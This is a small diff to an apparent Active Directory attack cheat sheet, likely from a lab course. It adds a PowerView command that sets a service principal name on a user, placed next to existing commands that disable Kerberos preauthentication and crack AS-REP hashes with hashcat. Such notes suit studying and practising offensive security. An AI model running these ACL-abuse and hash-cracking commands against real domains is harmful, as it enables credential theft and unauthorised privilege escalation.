@@ -251,9 +251,13 @@ hashcat -m 18200 <hash> -a 0 <wordlist> -o outputfile.txt
 
 # Abuse ACL
 
-Set AS-REP to user
+### Set AS-REP to user
 ```
 Set-DomainObject -Identity <User> -XOR @{useraccountcontrol=4194304} -Verbose
+```
+### Set SPN to user
+```
+Set-DomainObject -Identity <User> -Set @{serviceprincipalname='dcorp/<whateverServiceName>'} -Verbose
 ```
 --------------------------------------------------------------
 
